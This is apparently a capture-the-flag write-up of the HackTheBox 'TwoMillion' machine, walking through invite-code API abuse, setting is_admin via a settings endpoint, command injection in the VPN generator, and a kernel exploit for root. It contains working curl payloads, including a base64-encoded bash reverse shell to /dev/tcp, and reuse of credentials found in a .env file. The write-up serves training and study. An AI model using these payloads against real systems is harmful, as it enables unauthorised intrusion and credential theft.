---
title: TwoMillion
author: siresire
date: 2024-02-29 07:10:00 +0800
categories: [Hackthebox, Linux, easy]
tags: [API,curl]
render_with_liquid: false
---


># CVE-2023-0386

# Enumerations 

## Nmap scan

```yaml
nmap -vv -sV -oN nmap.scans 10.10.11.221
```

![Alt text](/assets/img/htb/tm_1.png)
2 ports are open here 

## Checking port 80

Here we have a old HTB webiste interface

![Alt text](/assets/img/htb/tm_2.png)

going to join , we are prompted to an inviteation code in order to create an account

![Alt text](/assets/img/htb/tm_3.png)

punched in random code and it spit out the following error message

In the backend there is a javascript code that is used to verify the code and then redirects you to registration page 

![Alt text](/assets/img/htb/tm_4.png)

Tried to go to the registration page without the code and after tying yo create an account, I was prompetd with this error message

![Alt text](/assets/img/htb/tm_5.png)

Cheking on burp again we do have this code ,javascript code

```javascript
   <!-- scripts -->
    <script src="/js/htb-frontend.min.js"></script>
    <script defer src="/js/inviteapi.min.js"></script>
    <script>
        $(document).ready(function() {
            // Retrieve the invite code from localStorage
            var inviteCode = localStorage.getItem('inviteCode');

            // Fill the input field
            $('#code').val(inviteCode);
        });
    </script>
```

cheking in this script found here `/js/inviteapi.min.js`, we found an obfuscated javascript

![Alt text](/assets/img/htb/tm_6.png)

from this site [link](https://lelinhtinh.github.io/de4js/), I decode the javascript obfuscated code and had this 

```javascript
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```

## Let's try to create an invitation code 

Now we can make a request to this API `/api/v1/invite/how/to/generate` using either pythia or curl or burpsuit 

```yaml
curl -X POST http://2million.htb/api/v1/invite/how/to/generate | jq
```
and then we had this 

![Alt text](/assets/img/htb/tm_7.png)

Decoded the ROT13 message with the following command

```yaml
echo "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr" | tr ['A-Za-z'] '[N-ZA-Mn-za-m]' 
```
![Alt text](/assets/img/htb/tm_8.png)

Made a post request  here `/api/v1/invite/generate` and we had a key with was base64 encoded
Decoded and used to create an account

![Alt text](/assets/img/htb/tm_9.png)


## Logging in 

After geetting the code , you are able to create an account with no issues and login 

![Alt text](/assets/img/htb/tm_10.png)

loggin in you get the default web UI of hackthebox with unlicable links 

![Alt text](/assets/img/htb/tm_11.png)

Going to burp , we had one link clicable ,Access wich when clicked downloads the vpn for the account

![Alt text](/assets/img/htb/tm_12.png)


## Cheking the API

trying to curl with the command `curl -v -S http://2million.htb/api`, we get 401 Unauthorized error 
![Alt text](/assets/img/htb/tm_13.png)

going back to burp ,we had session Cookie: PHPSESSID, so I supplied it to curl 

```yaml
curl -S http://2million.htb/api --cookie "PHPSESSID=cpm0c8lt568v2sv5rh65laks9e" | jq 
```

![Alt text](/assets/img/htb/tm_14.png)

Afer checking the  content of that api we had all this CRUD functionality

```JSON
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

### Check if user is admin

Checking if the user is admin we got false result

![Alt text](/assets/img/htb/tm_15.png)

### Generate VPN for specific user

 we are unauthorized with 401 error message

 ![Alt text](/assets/img/htb/tm_16.png)


### Update user settings

afetr getting invalid content type we suppied the headers in the curl `--header "Content-Type: application/json"` command and got this error message

 ![Alt text](/assets/img/htb/tm_17.png)

 supplied the data `--data '{"email" :"test@local.com"}` and got this error message, it needs to be is_admin parameter

 ![Alt text](/assets/img/htb/tm_18.png)

 After supplying is admin parameter and giving it  value of 1 , using out session cookie, we were able to be admin user

 ![Alt text](/assets/img/htb/tm_19.png)

 validating if we are admin user , we use `Check if user is admin` APi 

 ![Alt text](/assets/img/htb/tm_20.png)

## Exploitation 

Now that we are admin user, we can try generating the vpn configuration for admin user

```yaml
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=cpm0c8lt568v2sv5rh65laks9e" --header "Content-Type: application/json" --data '{"username":"test"}' 
```
 ![Alt text](/assets/img/htb/tm_21.png)

After executing the command, a VPN configuration file is generated for the user "test" and displayed. If the VPN generation process utilizes PHP's exec or system functions without adequate filtering, there's a risk of injecting malicious code into the username field, potentially leading to remote system command execution.

```yaml
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=cpm0c8lt568v2sv5rh65laks9e" --header "Content-Type: application/json" --data '{"username":"test;ls -sail;"}'

```
 ![Alt text](/assets/img/htb/tm_22.png)


before getting a reverse shell, I tried to check if there is a communication outise the machine pinging us back

 ![Alt text](/assets/img/htb/tm_23.png)

and using the command `sudo tcpdump -i tun0 icmp` we had ping requests hitting us back
 

I used a bash script to get a reverse shell `bash -i >& /dev/tcp/10.10.16.15/4444 0>&1`
converted it to base64 and bash it to the curl command and got a reverse shell

```yaml
 curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=cpm0c8lt568v2sv5rh65laks9e" --header "Content-Type: application/json" --data '{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNS80NDQ0IDA+JjEK | base64 -d | bash;"}'
```

 ![Alt text](/assets/img/htb/tm_24.png)

 In the same folder we had some creds in .env file 

![Alt text](/assets/img/htb/tm_25.png)

Tried the creds with ssh and we are in 

![Alt text](/assets/img/htb/tm_26.png)


# Privilege Escalation

Enumerating user's mails in /var/mail reveals a file called admin , which contains all the emails for our current user.

we had this 
![Alt text](/assets/img/htb/tm_27.png)

After googling I found it was kenel exploit and landed to this github repository [link](https://github.com/sxlmnwb/CVE-2023-0386)

This was on how to use it 
![Alt text](/assets/img/htb/tm_28.png)

So I downloaded it using the wget command 
![Alt text](/assets/img/htb/tm_29.png)

unziped it and ran it 

![Alt text](/assets/img/htb/tm_30.png)

The exploit is successful  as  I was was root